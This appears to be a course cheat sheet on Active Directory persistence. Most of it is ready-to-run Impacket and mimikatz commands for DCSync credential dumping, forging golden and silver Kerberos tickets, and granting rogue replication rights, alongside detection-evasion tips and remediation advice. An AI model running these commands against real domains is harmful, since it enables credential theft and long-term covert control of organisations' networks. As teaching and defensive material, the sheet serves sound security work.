# Cheat sheet — Persistence in AD

*Companion to [Module 07 — Persistence in AD](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## Ingredients you need first

```bash
# Domain SID (embedded in every forged ticket)
lookupsid.py corp.local/jsmith:'Welcome1!'@10.10.0.10 | head       # or PowerView: Get-DomainSID
# krbtgt NT hash (for golden) — pull via DCSync
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.10 -just-dc-user krbtgt
# Service account hash (for silver) — e.g. the target host's machine account
secretsdump.py corp.local/administrator:'P@ss'@10.10.0.10 -just-dc-user 'SRV-FILE-01$'
```

## Golden ticket — forged TGT from the krbtgt hash

```bash
# Forge a TGT for any user, any group, ~10-year default lifetime. -nthash = krbtgt hash.
ticketer.py -nthash <krbtgt_NT_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
# → writes administrator.ccache. Use it:
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@dc01.corp.local     # -k = use the Kerberos ticket
secretsdump.py -k -no-pass corp.local/administrator@dc01.corp.local
```

## Silver ticket — forged TGS from a service account hash

```bash
# Bypasses the KDC entirely (no Event 4769). -spn scopes it to one service on one host.
ticketer.py -nthash <SRV-FILE-01$_NT_hash> -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/srv-file-01.corp.local administrator
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass corp.local/administrator@srv-file-01.corp.local
```

## DCSync persistence — grant replication rights, pull hashes later

```bash
# Grant a low-priv account the two DS-Replication rights on the domain object (needs WriteDacl on domain)
dacledit.py -action write -rights DCSync -principal jsmith -target "corp.local" \
  corp.local/administrator:'P@ss' -dc-ip 10.10.0.10
# From then on, jsmith can pull any credential with no DA:
secretsdump.py corp.local/jsmith:'Welcome1!'@10.10.0.10 -just-dc     # DCSync
# mimikatz equivalent:
#   lsadump::dcsync /domain:corp.local /user:krbtgt
```

## What "remediated" actually requires

```bash
# Rotate krbtgt TWICE (Kerberos keeps the previous hash for interop — one reset is not enough).
# Microsoft's reset script or: reset krbtgt password, wait for replication + ticket lifetime, reset again.
# Then audit:
dacledit.py -action read -target "corp.local" ...     # domain-object ACL for rogue DCSync ACEs
#   AdminSDHolder object for added ACEs (SDProp re-stamps them to protected groups every ~60 min)
#   for rogue / unexpected domain controllers
```

## Gotchas worth remembering

- **Golden = the printing press, not a stolen badge.** With the `krbtgt` hash you mint identities forever;
  resetting user passwords or revoking DA does nothing. Only rotating `krbtgt` (twice) closes it.
- **Rotate `krbtgt` twice — always.** A single reset leaves the previous hash valid for interoperability,
  so any golden ticket still works. And outstanding tickets stay valid until their embedded expiry regardless.
- **Silver tickets never touch the KDC — so there's no 4769 at all.** They're harder to detect than golden
  tickets; the seam is a service accepting a ticket for a TGT nobody requested. Scope them tight and they're near-invisible.
- **DCSync ACEs and AdminSDHolder additions don't show in a group-membership review.** Audit the *ACLs* on
  the domain object and AdminSDHolder — Event 4662 (replication by a non-DC account) is the runtime tell.
- **AdminSDHolder abuse reinstates itself.** Remove the attacker's ACE from Domain Admins and SDProp puts it
  back within ~60 minutes. You have to fix AdminSDHolder itself, not just the protected group.
- **Clock skew still bites** — a forged ticket with a bad lifetime or a skewed attacker clock fails at use;
  keep the attacker box in sync with the DC.
